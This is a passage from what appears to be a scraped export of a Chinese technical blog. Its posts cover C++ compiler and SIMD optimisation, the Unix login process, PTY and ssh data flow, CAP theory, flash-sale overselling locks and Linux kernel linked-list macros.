是堆栈指针寄存器，和函数的调用与返回相关。 eax 是用于保存返回值的寄存器。 64 位 x86 架构中的通用寄存器有：rax, rcx, rdx, rbx, rsi, rdi, rsp, rbp, r8, r9, r10, r11, ..., r15 其中 r8 到 r15 是 64 位 x86 新增的寄存器，给了汇编程序员更大的空间，降低了编译器处理寄存器翻车（register spill）的压力。 64 位比 32 位机器相比，除了内存突破 4GB 限制外，也有一定性能优势。 汇编语言 GCC 编译器所生成的汇编语言属于AT&amp;T系列。 1gcc -fomit-frame-pointer -fverbose-asm -S main.cpp -o asm.S 使用 -O3 （Release级别）查看编译器优化后的汇编程序。 1gcc -O3 -fomit-frame-pointer -fverbose-asm -S main.cpp -o asm.S lea lea 是加载表达式的地址，相当于&amp;。 1leal (%rdi,%rsi), %eax 相当于 1eax = &amp;*(rdi + rsi) 线性地址访问优化 movslq 部分将32位寄存器扩展到64位，再进行访存计算。 优化建议： 指针的索引尽量用 size_t 类型。 不需要用 movslq 从 32 位符号扩展到 64 位，更高效。而且也能处理数组大小超过 INT_MAX 的情况。 推荐始终用 size_t 表示数组大小和索引。 浮点寄存器 浮点作为参数和返回使用 xmm 系列寄存器。 xmm 寄存器有 128 位宽。可以容纳 4 个 float，或 2 个 double。 对于浮点数寄存器操作指令，有特殊的指令形式。比如加法： 1addss add 表示执行加法操作。 第一个 s 表示标量(scalar)，只对 xmm 的最低位进行运算；也可以是 p 表示矢量(packed)，一次对 xmm 中所有位进行运算。（单个指令处理多个数据的技术称为 SIMD（single-instruction multiple-data）） 第二个 s 表示单精度浮点数(single)，即 float 类型；也可以是 d 表示双精度浮点数(double)，即 double 类型。 即： addss：一个 float 加法。 addsd：一个 double 加法。 addps：四个 float 加法。 addpd：两个 double 加法。 编译器生成的汇编里，有大量 ss 结尾的指令则说明矢量化失败；如果大多数都是 ps 结尾则说明矢量化成功。 SIMD single-instruction multiple-data 可以大大增加计算密集型程序的吞吐量。 通常认为利用同时处理 4 个 float 的 SIMD 指令可以加速 4 倍。 但是如果你的算法不适合 SIMD，则可能加速达不到 4 倍；也可能因为 SIMD 让访问内存更有规律，节约了指令解码和指令缓存的压力等原因，出现加速超过 4 倍的情况。 编译器优化 对于简单的代数运算，编译器可以帮助优化计算，直接返回结果。 但是前提是：1. 代码简单；2. 代码不涉及动态内存分配。 代码过于复杂，涉及的语句数量过多时，编译器会放弃优化。 简单的代码，比什么优化手段都强。 堆上的容器 存储在堆上（妨碍优化）： vector, map, set, string, function, any unique_ptr, shared_ptr, weak_ptr 存储在栈上（利于优化）： array, bitset, glm::vec, string_view pair, tuple, optional, variant constexpr 如果发现编译器放弃了自动优化，可以用 constexpr 函数迫使编译器进行常量折叠，但是会让编译变得很慢。 不过，constexpr 函数中无法使用非 constexpr 的容器：vector, map, set, string 等。 函数内联 如果函数的实现和声明分离，在调用时，被称为调用外部函数。调用时，链接器会通过 PLT 函数链接表，在其他 .o 文件中查找函数的定义。 如果函数实现就在调用的同一个文件中，称为内部函数。此时会直接调用，而不是通过链接器，减轻了链接器的负担。 只有定义在同一个文件的函数可以被内联。 为了效率我们可以尽量把常用函数定义在头文件里，然后声明为 static。这样调用他们的时候编译器看得到他们的函数体，从而有机会内联。 当编译器看得到被调用函数实现的时候，会直接把函数实现贴到调用他的函数里，实现函数内联。 inline 关键字 在现代编译器的高强度优化下，加不加 inline 无所谓。只要他看得见 other 的函数体定义，就会自动内联。 内联与否和 inline 没关系，内联与否只取决于是否在同文件，且函数体够小。 想要性能，定义在头文件声明为 static 即可，没必要加 inline 的。static 纯粹是为了避免多个 .cpp 引用同一个头文件造成冲突，并不是内联必需的。 可以实验测试，在线做编译器实验：https://godbolt.org/。 指针优化 1234void func(int *a, int *b, int *c) &#123; *c = *a; *c = *b;&#125; 为什么编译器不优化掉 c = a？ 因为 b 和 c 可能指向同一个变量。 优化前相当于：b = a; b = b; 最后 b 变成了 a。 如果优化了：b = b; 最后 b 没有改变。 这种情况叫做 pointer aliasing。 __restrict __restrict 是一个提示性的关键字，是程序员向编译器保证：这些指针之间不会发生重叠 （pointer aliasing），从而可以放心地优化。 实际上，__restrict 只需要加在所有具有写入访问的指针上，就可以优化成功。即只需加在非 const 参数之前即可。 因为只读的变量，随便几个指针指向它无所谓。 volatile 加了 volatile 的对象，编译器会放弃优化对他的读写操作。做性能实验的时候非常有用。 volatile 在 * 前面而，__restrict 在 * 后面。 volatile 是禁用优化，__restrict 是帮助优化。 restrict 是 C99 标准关键字，但不是 C++ 标准的关键字。__restrict 其实是编译器的“私货”，不在C++标准中，好在大多数主流编译器都支持。 矢量化 合并写入 编译器可以将两个 int32 的写入合并为一个 int64 的写入。但如果访问的两个元素地址间有跳跃，就不能合并了。 不管是编译器还是 CPU，都喜欢顺序的连续访问。 两个 int32 可以合并为一个 int64。四个 int32 可以合并为一个 __m128。 八个 int32 可以合并为一个 __m256。 xmm0 由 SSE 引入，是个 128 位寄存器。他可以一次存储 4 个 int，或 4 个 float。 如果硬件支持AVX指令集，还可以使用 256 位的 ymm0 寄存器。gcc -march=native 让编译器自动判断当前硬件支持的指令。 编译器会使用 SIMD 指令进行优化。 数组清零 编译器会自动分析你是在做拷贝或是清零，并优化成对标准库这俩的调用。 数组循环赋值 12345void func(int *a, int n) &#123; for (int i = 0; i &lt; n; ++i) &#123; a[i] = i; &#125;&#125; n 如果是 4 的倍数，使用SIMD指令一次写入 4 个 int。 如果 n 不是 4 的倍数，将能被4整除的部分使用SIMD，剩余边界部分，每次处理 1 个。 如果能保证指针 a 总是对齐到 16 字节，在 GCC 编译器中这样写： 1234567void func(int *a, int n) &#123; n = n / 4 * 4; a = (int*)__builtin_assume_aligned(a, 16); for (int i = 0; i &lt; n; ++i) &#123; a[i] = i; &#125;&#125; C++20 引入了标准化的 std::assume_aligned 1234567void func(int *a, int n) &#123; n = n / 4 * 4; a = std::assume_aligned&lt;16&gt;(a); for (int i = 0; i &lt; n; ++i) &#123; a[i] = i; &#125;&#125; 数组重叠 在运行时检测 a, b 指针的差是否超过 1024 来判断是否有重叠现象。 如果没有重叠，则跳转到 SIMD 版本高效运行。 如果重叠，则跳转到标量版本低效运行，但至少不会错。 编译器编译两个版本的代码，ps结尾指令为矢量化指令，ss结尾指令为标量化指令： __restrict 关键字可以加以优化： 只需要生成一个 SIMD 版本了，没有了运行时判断重叠的焦虑。 或者，使用 OpenMP : 来迫使编译器无视指针别名的问题，并启用 SIMD 优化。编译参数设置为 gcc -fopenmp。 gcc 也提供了相似的编译指令： 循环中的if 有 if 分支的循环体是难以 SIMD 矢量化的。 在编译器看来，is_mul 是一个常量，于是把 if 分支判断挪到了 for 外面来。 这样就可以使用 SIMD 指令。这一优化过程，编译器可以自动进行。 循环中的不变量 dt * dt 和当前 i 无关，因此可以移到循环体外，提前计算，避免重复计算。 在使用了 （dt * dt）条件下，编译器可以自动优化，但是只要去掉 (dt * dt) 的括号就会优化失败。因为乘法是左结合的，就相当于 (b[i] * dt) * dt 编译器识别不到不变量，从而优化失败。 要么帮编译器打上括号帮助他识别，要么手动提取不变量到循环体外。 循环中的外部函数 避免在 for 循环体里调用外部函数，把他们移到同一个文件里，或者放在头文件声明为 static 函数。这样编译器能看到调用函数的函数体，才能进行内联优化。 循环展开 每次执行循环体 a[i] = 1后，都要进行一次判断 i &lt; 1024。导致一部分时间花在判断是否结束循环，而不是循环体里。 对于 GCC 编译器，可以用 #pragma GCC unroll 4 表示把循环体展开为4个，相当于： 但是不建议手动这样写，会妨碍编译器的 SIMD 矢量化。 对小的循环体进行 unroll 可能是划算的，但最好不要 unroll 大的循环体，否则会造成指令缓存的压力反而变慢！ 嵌套循环 编译器担心 c 和 a 可能会指向同一个地址，而连续判断三个指针是否有重合又过于复杂，放弃了矢量化。 解决方案1：先读到局部变量，累加完毕后，再写入 编译器认为不存在指针别名的问题，矢量化成功。 解决方案2：先累加到初始为 0 的局部变量，再累加到 c 该解决方案比起前一种，由于加法顺序原因，算出来的浮点精度更高，c[i] 后面可能很大了。 结构体 结构体对齐会影响到矢量化。 两个 float 的结构体，对齐到 8 字节，可以成功 SIMD 矢量化。 三个 float 的结构体，对齐到 12 字节，矢量化失败。 追加了一个没有用的 4 字节变量，整个结构体变成 16 字节大小。 矢量化反而成功。 计算机喜欢 2 的整数幂，2, 4, 8, 16, 32, 64, 128...。结构体大小若不是 2 的整数幂，往往会导致 SIMD 优化失败。 alignas C++11 的新语法。在 struct 后加上 alignas(要对齐到的字节数) 即可实现同样效果，就不需要手动写 padding 变量了。 但是这种padding策略，也有可能不仅不变快，反而还变慢。SIMD 和缓存行对齐只是性能优化的一个点，又不是全部。还要考虑结构体变大会导致内存带宽的占用，对缓存的占用等一系列连锁反应，总之，要根据实际情况选择优化方案。 AOS 与 SOA AOS（Array of Struct）单个对象的属性紧挨着存。SOA（Struct of Array）属性分离存储在多个数组。 AOS 必须对齐到 2 的幂才高效，SOA 就不需要。SOA 不符合直觉，但通常是更高效的。 SOA：分离存储多个属性。不符合面向对象编程 (OOP) 的习惯，但常常有利于性能。又称之为面向数据编程 (DOP)。 成功 SIMD 矢量化。 AOSOA 4 个对象一组打包成 SOA，再用一个 n / 4 大小的数组存储为 AOS。 优点：SOA 便于 SIMD 优化；AOS 便于存储在传统容器；AOSOA 两者得兼。 缺点：需要两层 for 循环，不利于随机访问；需要数组大小是 4 的整数倍，不过可以用边界特判法（单独处理不能矢量化部分）解决。 Benchmark aos 12345678910111213struct Point &#123; float x; float y; float z;&#125;;Point ps[N];void compute() &#123; for (int i = 0; i &lt; N; i++) &#123; ps[i].x = ps[i].x + ps[i].y + ps[i].z; &#125;&#125; aos_aligned 12345678910struct Point &#123; float x; float y; float z; char padding[4];&#125;;Point ps[N];// 同compute aos_parallel 1234567891011121314struct Point &#123; float x; float y; float z;&#125;;Point ps[N];void compute() &#123;#pragma omp parallel for for (int i = 0; i &lt; N; i++) &#123; ps[i].x = ps[i].x + ps[i].y + ps[i].z; &#125;&#125; aosoa 123456789101112131415struct Point &#123; float x[M]; float y[M]; float z[M];&#125;;Point ps[N / M];void compute() &#123; for (int i = 0; i &lt; N / M; i++) &#123; for (int j = 0; j &lt; M; j++) &#123; ps[i].x[j] = ps[i].x[j] + ps[i].y[j] + ps[i].z[j]; &#125; &#125;&#125; soa 12345678910111213struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123; for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_size_t 12345678910111213struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123; for (std::size_t i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_simd 1234567891011121314struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123;#pragma omp simd for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_unroll 123456789101112131415161718struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123;#if defined(__GNUC__) || defined(__clang__)#pragma GCC unroll 32#elif defined(_MSC_VER)#pragma unroll 32#endif for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; soa_parallel 1234567891011121314struct Point &#123; float x[N]; float y[N]; float z[N];&#125;;Point ps;void compute() &#123;#pragma omp parallel for for (int i = 0; i &lt; N; i++) &#123; ps.x[i] = ps.x[i] + ps.y[i] + ps.z[i]; &#125;&#125; 测试 12345678910111213#include &lt;iostream&gt;#include &lt;chrono&gt;template &lt;class Name, class Func&gt;static inline void profile(int times, Name const &amp;name, Func const &amp;func) &#123; auto t0 = std::chrono::steady_clock::now(); for (int i = 0; i &lt; times; i++) &#123; func(); &#125; auto t1 = std::chrono::steady_clock::now(); long dt = std::chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(t1 - t0).count() / times; std::cout &lt;&lt; name &lt;&lt; \": \" &lt;&lt; dt &lt;&lt; std::endl;&#125; 结果 单线程的 SOA + unroll 甚至略微超过了并行版的 AOS。OpenMP 并非万能，单线程的程序认真优化后一样打败无脑并行。 性能还和array大小 N 有关。 std::vector 使用 pragma omp simd 或 pragma GCC ivdep 可以解决 vector 的 pointer aliasing 问题。 另外，使用 std::vector 也可以实现 SOA，不过，请保证 vector 是同样大小。 C++数学运算优化 除法变乘法 123float func(float a) &#123; return a / 2;&#125; 汇编变为mul乘法，* 0.5f。 但是以下程序却没有优化： 12345void func(float *a, float *b) &#123; for (int i = 0; i &lt; 1024; i++) &#123; a[i] /= b; &#125;&#125; 因为编译器害怕 b = 0。 乘法比除法更快，所以可以提前计算好 b 的倒数避免重复求除法。 123456void func(float *a, float *b) &#123; float inv_b = 1 / b; for (int i = 0; i &lt; 1024; i++) &#123; a[i] *= inv_b; &#125;&#125; -ffast-math -ffast-math 选项让 GCC 更大胆地尝试浮点运算的优化，有时能带来 2 倍左右的提升。作为代价，他对 NaN 和无穷大的处理。 如果你能保证，程序中永远不会出现 NaN 和无穷大，那么可以放心打开 -ffast-math。 数学函数请加 std:: 前缀 sqrt 只接受 double sqrtf 只接受 float std::sqrt 重载了 double 和 float（推荐） abs 只接受 int fabs 只接受 double fabsf 只接受 float std::abs 重载了 int, double, float（推荐） 请勿用全局的数学函数，他们是 C 语言的遗产。始终用 std::sin, std::pow 等。 小结 函数尽量写在同一个文件内 避免在 for 循环内调用外部函数 非 const 指针加上 __restrict 修饰 试着用 SOA 取代 AOS 对齐到 16 或 64 字节 简单的代码，不要复杂化 试试看 #pragma omp simd 循环中不变的常量挪到外面来 对小循环体用 #pragma unroll -ffast-math 和 -march=native","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Compiler","slug":"Compiler","permalink":"https://racleray.github.io/tags/Compiler/"}],"author":"HeRui"},{"title":"Unix用户终端登录过程分析","slug":"Unix用户终端登录过程分析","date":"2023-04-24T13:01:35.000Z","updated":"2024-01-11T02:08:51.535Z","comments":true,"path":"posts/ff5b020d.html","link":"","permalink":"https://racleray.github.io/posts/ff5b020d.html","excerpt":"Unix用户终端登录过程分析","text":"login 之前 UNIX系统中，用户在终端登录过程大致为（Linux系统与之差异不大，主要是是配置文件组织形式有差异）： 系统自举（系统启动初始化）时，内核创建进程 1 号进程init，init 进入多用户模式，读取 /etc/tty 对每一个允许登录的终端设备，init 依次调用 fork，子进程 exec getty getty 对终端设备调用 open 函数，以读写方式打开，也可能在某一等待连接线路的设备处等待 文件描述符 0 1 2 被设置指向该设备 输出 login: 字符串等待用户输入 输入成功后，按照以下方式调用login程序 1execle(\"/bin/login\", \"login\", \"-p\", username, (char *)0, envp); getty 以终端名称和在 gettytab 中说明的环境变量字符串，为 login 创建一个环境参数 envp。-p 表示保留该环境参数。 上图中的所有进程目前都具有 root 权限，因为直接从 init 继承 fork，而继承了权限。并且 exec 并不改变进程 ID，下面三个进程的 ID 相同。 这部分说的终端都不是伪终端 login 接下来的 login 的工作是： getpwnam 取得用户口令文件 getpass 读取用户输入密码 crypt 对输入密码加密，并于 shadow 文件中的 pw_passwd 字段比较 若口令无效，exit(1) init 进程读取返回值后，再次 fork 执行 getty，重复上述过程。 以上是UNIX系统的用户登录验证过程，Linux 等后续较新的系统使用更灵活的 PAM 验证方案。 login 之后 完成 login 之后： chdir 到用户起始目录 chown 改变当前终端所有权为当前登录用户 改变当前终端设备的访问权限为 “用户读写” setgid, initgroups 设置进程组 ID 用 login 得到的信息，初始化：HOME目录、shell、username、PATH 等 setuid 设置进程用户 ID 为当前登录用户的 ID，并启动该用户设置的登录 shell 1execl(\"/bin/sh\", \"-sh\", (char *)0); 此处是由root 调用的 setuid，所以可以设置进程的：实际用户ID、有效用户ID和保存用户ID。 shell 读取启动文件，.profile 之类（可能由其他名字） 在终端输出输入提示符，等待用户输入命令。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Linux","slug":"Notes/Linux","permalink":"https://racleray.github.io/categories/Notes/Linux/"}],"tags":[{"name":"Unix","slug":"Unix","permalink":"https://racleray.github.io/tags/Unix/"},{"name":"Shell","slug":"Shell","permalink":"https://racleray.github.io/tags/Shell/"}],"author":"HeRui"},{"title":"shell交互逻辑分析","slug":"shell交互逻辑分析","date":"2023-04-12T11:53:37.000Z","updated":"2024-01-11T02:08:51.541Z","comments":true,"path":"posts/66515c26.html","link":"","permalink":"https://racleray.github.io/posts/66515c26.html","excerpt":"shell 终端逻辑分析","text":"在 terminal emulator（终端模拟器）中启动bash（shell）子进程时，它把bash子进程的0/1/2（标准输入/输出/错误输出）文件描述符（以此 fd 找到对应的 file 实例）都指向自己（真正指向的是 terminal emulator 向内核分配的PTY数据通道的slave端）。这样当bash做标准输入输出操作时，它其实都是在和 terminal emulator交互。 bash 本身不处理键盘事件，也不负责输出，只是解释用户输入。 当bash要执行某个程序时，一般语言编译出的目标程序，也会把标准输入/输出/错误输出分别定义为0/1/2。 在bash中运行程序时，默认情况下，子进程的0/1/2文件描述符指向是继承自bash的，所以也同样都指向了同一个 terminal emulator。 严格来讲，这里讲的是 pseudo terminal emulator 伪终端 (PTY)， 与运行在内核的 terminal emulator 不同。PTY 运行在用户空间，通过内核中的数据通道，建立进程间的数据交互。 内核的 terminal emulator 读取键盘驱动传递的数据，向显卡驱动发送字符。通过 tty 驱动与用户进程相连。 pseudo terminal emulator 运行在用户空间，此时的 tty 驱动只负责 pseudo terminal emulator 进程与 shell 进程的交互，维护一个数据交互通道。而 pseudo terminal emulator 仍然与键盘或者显卡驱动交互。 当用户输入时，字符会被回传到 PTY master。在 terminal emulator 输入时，会在指定内存中缓冲这些字符。当用户按回车键时，它才将这些字符发送到 PTY slave。 terminal emulator 直接执行程序 在 terminal emulator 中执行程序的过程可以简化如下： 在terminal emulator中输入 ./a.out 命令，该命令沿着内核PTY数据通道，到达bash的标准输入。 bash从标准输入中读取 ./a.out 命令，然后调用fork函数，新建一个子进程，用于执行 a.out 程序。 子进程的 标准输入/输出/错误输出 文件描述符继承自bash（图中的虚线表示在上述程序中没有数据传递）。 a,out 程序执行时，会先向标准输出写 Hello 字符串，然后再向标准错误输出写world字符串。 这两个字符串会传递给内核PTY数据通道。terminal emulator从PTY master fd中读取这些字符串，并显示在界面上。 上述例子中，a.out 进程的0/1/2文件描述符，都是指向内核PTY数据通道的slave端，并且通过该PTY数据通道和terminal emulator交互。 ssh 连接远程终端执行程序 在terminal emulator中输入./a.out命令后，该命令会沿着内核PTY数据通道，到达ssh进程的标准输入。 ssh进程从标准输入中读取到./a.out命令，然后将其写到socket fd里。 该命令会沿着socket fd指向的tcp连接，到达机器2的对应socket端。 在机器2上，sshd进程从它的socket fd中读取到./a.out命令，然后将其写到PTY master fd中。 该命令又会沿着机器2的内核PTY数据通道，到达bash进程的标准输入。 机器2上的bash进程，从标准输入中读到该命令，然后调用fork函数，创建一个子进程，用于执行a.out程序。 a.out程序执行时，会写hello到标准输出，写world到标准错误输出，这两个字符串又会沿着机器2的内核PTY数据通道，到达sshd进程的PTY master fd。 sshd进程从PTY master fd中读取到a.out进程输出的内容，并写到socket fd里。 该数据又沿着socket fd指向的tcp连接，最终会到达机器1对应的socket端。 机器1中的ssh进程，从socket fd里读取到a.out程序的输出内容，并将其写到标准输出。 该数据会沿着机器1的内核PTY数据通道，到达terminal emulator的PTY master fd。 terminal emulator从PTY master fd中读取到对应的数据，最终将其显示在机器1屏幕上。 a.out 进程的 0 1 2 文件描述符都是指向机器2中 PTY slave 端，通过 tcp 链路与机器1 中 terminal emulator 相连。 机器1中对 terminal emulator 的输入，最终被机器2 的 ./a.out 读出。./a.out 的输出，最终返回到机器1的 terminal emulator 进程输出显示。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Linux","slug":"Notes/Linux","permalink":"https://racleray.github.io/categories/Notes/Linux/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://racleray.github.io/tags/Shell/"}],"author":"HeRui"},{"title":"CAP理论","slug":"CAP理论","date":"2023-04-12T06:24:12.000Z","updated":"2024-01-09T09:29:28.417Z","comments":true,"path":"posts/6940af88.html","link":"","permalink":"https://racleray.github.io/posts/6940af88.html","excerpt":"CAP 学习笔记","text":"基本概念 Consistency 一致性 所有节点 访问 同一份最新 的数据副本，最新 意味着所有的数据不能都是错误的 Availablity 可用性 每次请求都能获取到 非错的 响应，但是不能保证数据时最新的 Partition Tolerance 分区容错性 分区相当于对通信时限的要求，系统如果不能在一定时限内达成数据一致性，就意味着出现了分区 必须在 可用性 和 一致性 之间做出选择 也就是容忍分布式节点之间的网络包丢失或者延时，让系统仍然能正常运行 在分布式系统中，当节点之间由于出现故障，分区节点之间不连通，导致无法访问指定数据。这时的分区是不能容忍的。 为了提高分区容错性能，就需要将数据保存在不同的节点上，使用多个副本。但是副本越多，修改数据时，保持数据一致性的代价就越大。如果要保证一致性，那么就需要花更多的时间来同步数据。 这一延迟如果很长，又将导致可用性降低。 这就是 CAP 的核心矛盾所在。 这里的一致性，和关系型数据库事务ACID的C一致性不同。 分布式C：同一副本的一致性 事务C：一种一致性关系，a和b转账，那么在转账前中后，金额总数都是一样的。 对于一个分布式系统而言，不可能同时满足以上三点。 若没有网络波动和网络分区，只需要CA，P无从谈起； 若出现网络波动和网络分区，为了保证P，C和A只能选择其一。 注意这里的二选一，是在要达到严格的C或者A条件下。可以存在二者的折中选择，这也是各种系统优化算法的目的。可用性是可以在 0% 到 100% 之间连续变化的。一致性可以细分为强一致、弱一致和最终一致。系统的不同分区也可以有不同的认知。 退一步讲，我们使用缓存，不就是在追求访问速度吗？那么，如果系统对一致性性要求很高，那么也许该系统就不适合使用缓存。使用缓存，就表示着系统应该接受弱一致性或者最终一致性。一般情况下，是通过一定方案，来最大限度地避免数据不一致或者减少达到最终一致的时间，比如延时双删、异步更新、串行化等。 CAP示例 CAP是个说明什么是不可行的理论。 假设一个分布式系统有三台server，用户向其进行写入操作。若其中一个server写入成功就算向系统写入成功。 此时，若出现网络问题，三台server数据就可能出现不一致，C无法保证。但是系统认为成功，返回了结果，A得到保证。 假设一个分布式系统有三台server，用户向其进行写入操作。若三个server都写入成功才算向系统写入成功。 此时，若出现网络问题，三台server数据不能同时写入成功，系统返回错误，A无法保证。但是副本一致性得到保证，A得到保证。 分布式系统中的CAP 首先，分布式环境下，一般P是一定存在的，需要权衡的是 C 和 A。 对于NoSQL，注重可用性，是一个 AP 系统 对于分布式关系型数据库，必须要保证一致性，是一个 CP 系统 分布式关系型数据库，不能保证完全的100%可用性，但是一般要求 99.999% 的高可用性。所以被定义为 CP + HA 系统。其有两个指标： RPO（Recovery Point Objective）：恢复点目标。一般分布式数据库不会全部同时宕机或者受灾，只要有一台保留下了最新数据，RPO就为0。 RTO（Recovery Time Objective）：恢复时间目标。事故后整个系统恢复正常所需的时间，通过主备切换、重新选主等，仍可以恢复正常服务。一般而言 RTO 会在几分钟内。像一些使用raft协议的数据库，RTO会在30秒内。 分布式方案 Quorum Replication 要求 数据总副本数N，要小于，写入成功副本数W 与 读取成功副本数R 之和。即，永远会有至少一个副本是最新的且正确返回的。 在此基础上，进行 trade off。 比如，W=N、R=1。此时所有节点都写入成功，才返回系统写入成功，保证了写一致性，写可用性差。只要有一个节点可读到数据，就让系统返回结果，保证了读可用性，读一致性差。 W=1、R=N。此时有一个节点写入成功，就返回系统写入成功，保证了写可用性，写一致性差。所有节点都可读到最新数据，才让系统返回结果，保证了读一致性，读可用性差。 共识算法 不同节点间有通信交互，同时有一个leader节点管理读写服务，保证了一致性。但是leader节点出现问题，就不能保证可用性。通过选举算法，快速建立一个新leader，保证 99.999% 的高可用性。","categories":[{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/categories/Distributed-System/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/tags/Distributed-System/"},{"name":"CAP","slug":"CAP","permalink":"https://racleray.github.io/tags/CAP/"}],"author":"HeRui"},{"title":"超卖问题浅析","slug":"超卖问题浅析","date":"2023-03-09T05:26:42.000Z","updated":"2024-01-09T10:22:16.160Z","comments":true,"path":"posts/c47fc989.html","link":"","permalink":"https://racleray.github.io/posts/c47fc989.html","excerpt":"一个简单系统设计问题分析","text":"问题难点 1 突发访问量 前端优化 秒杀倒计时，不能发送下单请求，下单键不可用 下单后，不能重复下单请求，下单键不可用 JS程序设置用户请求最小间隔时间 使用前端缓存，相同页面直接从缓存刷新 后端优化 见后文 行业方案 使用队列组织 nginx 接收到的请求，业务服务器从队列中取，顺序处理 负载均衡 提升机器数量 nginx 接入层筛选限流，再转发到服务器 2 带宽限制 突发流量太大，需要从运营商临时购买 设置CDN缓存页面，分担服务器压力 3 大部分不会生成订单的请求 在 nginx 反向代理层，就进行筛选发送到服务器的请求 4 超卖问题 在同一时间内，数据库中没有及时更新库存量，多个用户抢到商品，但是只能有一个用户买到 行业方案 MySQL 悲观锁：数据库层面设置的写锁，保证修改只能同时被一个session执行，在完成前其他都需要等待 优点：稳定 缺点：锁等待，资源消耗 MySQL 乐观锁：程序设计时，增加的锁机制，比如增加版本号，在修改时先查询版本号是否被更改，没改动一次就更新版本号，此时只有一条SQL执行成功。 优点：比悲观锁并发量大 缺点：MySQL本身处理不了大量并发请求 队列：使用队列变成有序的请求处理 优点：稳定，可以处理大量并发请求 缺点：本身实时处理请求速率低，大量并发请求内存占用高 Redis 分布式锁：SETNX 只能设置一次键值，返回1，再次设置会返回0。基于此，多个线程只有一个线程的 SETNX 返回 1。超时时间后，删除 SETNX 设置的key。 优点：只限制处理库存时，只允许单线程执行 缺点：线程级的限制，资源浪费 Redis 乐观锁：Redis watch 机制，比如 watch 库存值得变化。当Redis事务开启后，库存值发生变化，就回滚当前事务。所以并发请求当有一个成功时，其他请求的事务都会回滚。 优点：没有限制线程的执行数量，只是打断冲突线程的执行。 缺点：在这些方法的比较中，缺点不明显，可以使用高性能的语言或者框架，进一步提升性能 方案设计 静态资源处理，图片、js、css、页面等 使用CDN 加大带宽 业务请求处理 Nginx 过滤大部分一定不会生成订单的请求 Nginx-Lua + Redis 乐观锁解决超卖问题 服务器处理少量请求","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"System Design","slug":"Notes/System-Design","permalink":"https://racleray.github.io/categories/Notes/System-Design/"}],"tags":[{"name":"System Design","slug":"System-Design","permalink":"https://racleray.github.io/tags/System-Design/"},{"name":"Nginx","slug":"Nginx","permalink":"https://racleray.github.io/tags/Nginx/"}],"author":"HeRui"},{"title":"Linux内核链表设计","slug":"Linux内核链表设计","date":"2023-02-25T05:11:15.000Z","updated":"2024-01-09T10:20:52.091Z","comments":true,"path":"posts/dd44df07.html","link":"","permalink":"https://racleray.github.io/posts/dd44df07.html","excerpt":"Linux内核链表设计","text":"123struct list_head &#123; struct list_head *next, *prev;&#125;; 双向循环链表。没有设计数据域，通用性和灵活性更好。 实际使用时，构成如下： 1234struct user_list &#123; void* data; struct list_head list;&#125; 初始化设计： 12345#define LIST_HEAD_INIT(name) &#123; &amp;(name), &amp;(name) &#125;// 初始化prev和next字段，让它们指向list_name变量本身#define LIST_HEAD(name) \\ struct list_head name = LIST_HEAD_INIT(name) 添加元素： 12345678910111213141516171819202122// simple, clear, neatstatic inline void __list_add(struct list_head *new, struct list_head *prev, struct list_head *next)&#123; next-&gt;prev = new; new-&gt;next = next; new-&gt;prev = prev; prev-&gt;next = new;&#125;static inline void list_add(struct list_head *new, struct list_head *head)&#123; __list_add(new, head, head-&gt;next);&#125;static inline void list_add_tail(struct list_head *new, struct list_head *head)&#123; __list_add(new, head-&gt;prev, head);&#125; 删除元素： 12345678910111213141516171819202122static inline void __list_del(struct list_head * prev, struct list_head * next)&#123; next-&gt;prev = prev; prev-&gt;next = next;&#125;/* * These are non-NULL pointers that will result in page faults * under normal circumstances, used to verify that nobody uses * non-initialized list entries. */#define LIST_POISON1 ((void *) 0x00100100)#define LIST_POISON2 ((void *) 0x00200200)static inline void list_del(struct list_head *entry)&#123; __list_del(entry-&gt;prev, entry-&gt;next); entry-&gt;next = LIST_POISON1; entry-&gt;prev = LIST_POISON2;&#125; 通过 list_head 成员，找到整个结构体的地址： 12345678#define list_entry(ptr, type, member) \\( \\ (type*) \\ ( \\ (char*)(ptr) - \\ (unsigned long)( &amp;((type*)0)-&gt;member ) \\ ) \\) type是包含 list_head 类型成员的自定义结构体，ptr 是 list_head ，指向 member 成员。 (unsigned long)( &amp;((type*)0)-&gt;member )：从 0 地址定义的一个结构，得到 member 成员的偏移量。ptr 进行偏移之后，得到自定义结构体的地址。 遍历节点： 123456#define __list_for_each(pos, head) \\ for (pos = (head)-&gt;next; pos != (head); pos = pos-&gt;next)#define list_for_each_safe(pos, n, head) \\ for (pos = (head)-&gt;next, n = pos-&gt;next; pos != (head); \\ pos = n, n = pos-&gt;next) safe版本保存了临时的 next 节点，即使 pos 被删除了，也能通过 n 找到 next 节点。 更常用的类似 list_entry 是 container_of。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Linux Kernel","slug":"Notes/Linux-Kernel","permalink":"https://racleray.github.io/categories/Notes/Linux-Kernel/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"https://racleray.github.io/tags/Data-Structure/"},{"name":"Linux 